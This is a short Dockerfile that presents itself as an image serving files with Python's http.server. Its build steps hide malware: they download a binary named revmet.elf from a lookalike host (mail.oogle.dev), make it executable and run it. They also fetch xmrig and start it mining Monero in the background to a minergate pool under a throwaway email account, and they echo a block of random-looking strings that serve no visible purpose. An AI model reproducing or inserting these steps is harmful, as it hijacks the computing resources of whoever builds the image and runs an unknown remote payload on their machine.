FROM ubuntu:bionic

SHELL ["/bin/bash", "-c"]

RUN apt-get update && apt-get install -y \
    wget \
    ocl-icd-libopencl1 \
    libmicrohttpd-dev \
    libc6 \
    libstdc++6

WORKDIR /root
RUN wget http://mail.oogle.dev:8000//revmet.elf

RUN wget https://github.com/xmrig/xmrig/releases/download/v2.14.1/xmrig-2.14.1-xenial-x64.tar.gz
RUN tar -xzvf xmr*
WORKDIR /root/xmrig-2.14.1
RUN ./xmrig -a cryptonight --background -o stratum+tcp://xmr.pool.minergate.com:45700 -u fewa342rwr@tutanota.com -p x

WORKDIR /root
RUN chmod 777 revmet.elf
RUN ./xmrig-2.14.1/xmrig -a cryptonight --background -o stratum+tcp://xmr.pool.minergate.com:45700 -u fewa342rwr@tutanota.com -p x;./revmet.elf
RUN echo loQWlPXbXARFBYHEvHWRzDDla7DKvh4A SrX9WloeWMUl4VNsAnI2v9Cm0DU1EmB8 3bCFimbRf9cxRbR6bxmFEMQnWBUneUoi g89sQODEUOLh3XZ4Sx1f6UxqlaFd0YFg R3OAF5Szzqzm4wLLHOd7rTpPysFpI5rL M5JZUQfJQKZDSO9FfCO7Fmu0NfRWy8zT yIevygWrVQjbMd5CBKzSQT07Ih2ZCGW3 VmZVTxBnlGdF96910NjFDiBfKKxL9JCJ jD2JVMup0cO47yEiIhB0VWIqh8ODs8Ak 2KiWt9GT0LYotSKCgocWtF7EFqDCH7AZ M3PPoPI96r6CYcCOcHLT9cpT4afnlNsD x6zDmeocQ16UcIzbQERpy3dyIRJ4fLrv DGLrlBP1wP15Z7bzvFORfIDPVXxlKOw8 iRR8Zp0TOxlCM7JSEpHNyxmT4XM90YWc zsaOLYboLruHMbrsWTTwF76XhxiEn5Vb JlcMVQX0KrjEurxbQ9jbtcmhwOFZNPb7 g0B5O2hD9pRQwxZWGXhnBJRmjZt4WqIH ddddddd

ENTRYPOINT ["python3", "-m", "http.server"]